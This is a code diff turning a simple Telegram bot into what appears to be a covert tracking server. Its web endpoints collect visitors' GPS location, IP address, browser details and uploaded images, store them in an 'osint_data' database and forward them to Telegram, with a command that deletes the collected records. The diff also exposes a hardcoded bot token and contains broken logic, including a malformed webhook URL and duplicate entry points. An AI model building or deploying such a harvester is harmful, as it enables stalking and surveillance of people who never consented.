@@ -197,72 +197,233 @@
 # https://tele-track-uefk.onrender.com
 
 import os
-from flask import Flask, request
-from telegram import Bot, Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
-import asyncio
+import sqlite3
 from datetime import datetime
+from flask import Flask, request, jsonify, send_file
+from telegram import Update, Bot
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+)
+import asyncio
+import requests
+import time
 
-# --- Configuration ---
-TELEGRAM_BOT_TOKEN = '8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0'
-SECRET_PATH = 'track123'  # your secret webhook path
-WEBHOOK_URL = f'https://tele-track-uefk.onrender.com/webhook/{SECRET_PATH}'  # replace with your public URL + secret path
-SAVE_DIR = 'saved_files'
+# -------------------- Config --------------------
+TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual token
+AUTHORIZED_KEY = "secretkey123"       # Change this to a more secure key
+WEBHOOK_URL = "https://tele-track-uefk.onrender.comwebhook"  # Update with your actual URL
 
-os.makedirs(SAVE_DIR, exist_ok=True)
+SAVE_FOLDER = "saved_files"
+os.makedirs(SAVE_FOLDER, exist_ok=True)
+authenticated_users = set()
 
-# --- Flask Setup ---
+# -------------------- Flask App --------------------
 app = Flask(__name__)
+
+# -------------------- Telegram Bot --------------------
 bot = Bot(token=TELEGRAM_BOT_TOKEN)
-
-# --- Telegram Handlers ---
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 Hello! Send me your location or a photo and I'll save it."
-    )
-
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    photo = update.message.photo[-1]  # highest resolution photo
-    file = await photo.get_file()
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = os.path.join(SAVE_DIR, f"{update.effective_user.id}_{timestamp}.jpg")
-    await file.download_to_drive(filename)
-    await update.message.reply_text("📸 Photo received and saved!")
-
-async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    loc = update.message.location
-    text = f"📍 Location received:\nLatitude: {loc.latitude}\nLongitude: {loc.longitude}"
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = os.path.join(SAVE_DIR, f"{update.effective_user.id}_{timestamp}.txt")
-    with open(filename, 'w') as f:
-        f.write(f"{text}\nTime: {timestamp}")
-    await update.message.reply_text(text)
-
-# --- Application Setup ---
 application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
-application.add_handler(CommandHandler("start", start))
-application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-application.add_handler(MessageHandler(filters.LOCATION, handle_location))
 
-# --- Webhook Route ---
-@app.route(f'/webhook/{SECRET_PATH}', methods=['POST'])
-def telegram_webhook():
-    try:
-        update = Update.de_json(request.get_json(force=True), bot)
-        # Run the update processing in a fresh event loop
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(application.process_update(update))
-        loop.close()
-    except Exception as e:
-        print("❌ Webhook error:", e)
-    return "OK", 200
+# -------------------- DB Setup --------------------
+def init_db():
+    conn = sqlite3.connect('osint_data.db')
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS osint_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            type TEXT,
+            latitude REAL,
+            longitude REAL,
+            accuracy REAL,
+            timestamp TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            file_path TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
 
-# --- Main entry point ---
+init_db()
+
+# -------------------- Telegram Utils --------------------
+def send_telegram_message(message):
+    for user_id in authenticated_users:
+        bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown")
+
+def send_telegram_image(image_path, caption=""):
+    for user_id in authenticated_users:
+        with open(image_path, "rb") as photo:
+            bot.send_photo(chat_id=user_id, photo=photo, caption=caption)
+
+
+def setup_webhook():
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            response = requests.get(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook",
+                params={
+                    'url': WEBHOOK_URL,
+                    'max_connections': 40,
+                    'drop_pending_updates': True
+                },
+                timeout=10
+            )
+            data = response.json()
+            print(f"Attempt {attempt+1}:", data)
+            
+            if data.get('ok'):
+                return True
+            else:
+                print("Error:", data.get('description'))
+                
+        except Exception as e:
+            print(f"Attempt {attempt+1} failed:", str(e))
+        
+        time.sleep(5)  # Wait before retrying
+    
+    return False
+
 if __name__ == '__main__':
-    print("🚀 Setting Telegram webhook...")
-    asyncio.run(bot.set_webhook(WEBHOOK_URL))
-    print(f"✅ Webhook set to: {WEBHOOK_URL}")
+    if setup_webhook():
+        print("✅ Webhook set successfully")
+    else:
+        print("❌ Failed to set webhook after retries")
+    
+    app.run(host='0.0.0.0', port=5000)
 
-    print("🚀 Starting Flask server...")
+# -------------------- Command Handlers --------------------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in authenticated_users:
+        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
+        return
+    await update.message.reply_text("✅ Server is live and bot is running!")
+
+async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text("Usage: /auth <key>")
+        return
+    if context.args[0] == AUTHORIZED_KEY:
+        authenticated_users.add(user_id)
+        await update.message.reply_text("🔑 Authenticated successfully!")
+    else:
+        await update.message.reply_text("❌ Invalid key!")
+
+async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")
+
+async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in authenticated_users:
+        await update.message.reply_text("🔒 You are not authenticated.")
+        return
+
+    deleted_files = 0
+    for file in os.listdir(SAVE_FOLDER):
+        file_path = os.path.join(SAVE_FOLDER, file)
+        if os.path.isfile(file_path):
+            os.remove(file_path)
+            deleted_files += 1
+
+    conn = sqlite3.connect('osint_data.db')
+    c = conn.cursor()
+    c.execute("DELETE FROM osint_data")
+    conn.commit()
+    conn.close()
+
+    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")
+
+# Register handlers
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("auth", auth))
+application.add_handler(CommandHandler("chatid", chatid))
+application.add_handler(CommandHandler("delete", delete))
+
+# -------------------- Webhook Route --------------------
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    try:
+        data = request.get_json(force=True)
+        update = Update.from_dict(data)
+        asyncio.run(application.process_update(update))
+    except Exception as e:
+        print("Webhook error:", e)
+    return "OK"
+
+# -------------------- Other Routes --------------------
+@app.route('/')
+def index():
+    return send_file('index.html')
+
+@app.route('/location', methods=['POST'])
+def receive_location():
+    data = request.get_json()
+    ip_address = request.remote_addr or "Unknown IP"
+    user_agent = request.headers.get('User-Agent', 'Unknown User Agent')
+
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    accuracy = data.get('accuracy', 'Unknown')
+
+    # Save to DB
+    conn = sqlite3.connect('osint_data.db')
+    c = conn.cursor()
+    c.execute('''
+        INSERT INTO osint_data (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    ''', ("location", lat, lon, accuracy, datetime.utcnow().isoformat(), ip_address, user_agent))
+    conn.commit()
+    conn.close()
+
+    # Telegram Message
+    message = (
+        f"📍 *New Location Received:*\n"
+        f"Latitude: `{lat}`\n"
+        f"Longitude: `{lon}`\n"
+        f"Accuracy: ±{accuracy} m\n"
+        f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
+        f"IP: `{ip_address}`\n"
+        f"User Agent: `{user_agent}`"
+    )
+    send_telegram_message(message)
+    return jsonify({"status": "OK"}), 200
+
+@app.route('/upload_image', methods=['POST'])
+def upload_image():
+    if 'image' not in request.files:
+        return jsonify({"error": "No image uploaded"}), 400
+
+    image_file = request.files['image']
+    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
+    image_file.save(filename)
+
+    conn = sqlite3.connect('osint_data.db')
+    c = conn.cursor()
+    c.execute('''
+        INSERT INTO osint_data (type, file_path, timestamp)
+        VALUES (?, ?, ?)
+    ''', ("image", filename, datetime.utcnow().isoformat()))
+    conn.commit()
+    conn.close()
+
+    send_telegram_image(filename, caption="🖼️ New Image Uploaded")
+    return jsonify({"status": "OK"}), 200
+
+# -------------------- Main --------------------
+if __name__ == '__main__':
+    # Set webhook
+    resp = requests.get(
+        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook",
+        params={"url": WEBHOOK_URL}
+    )
+    print("📡 Set Webhook:", resp.json())
+
+    # Start Flask server
+    print("🚀 Starting server on Render...")
     app.run(host='0.0.0.0', port=5000)
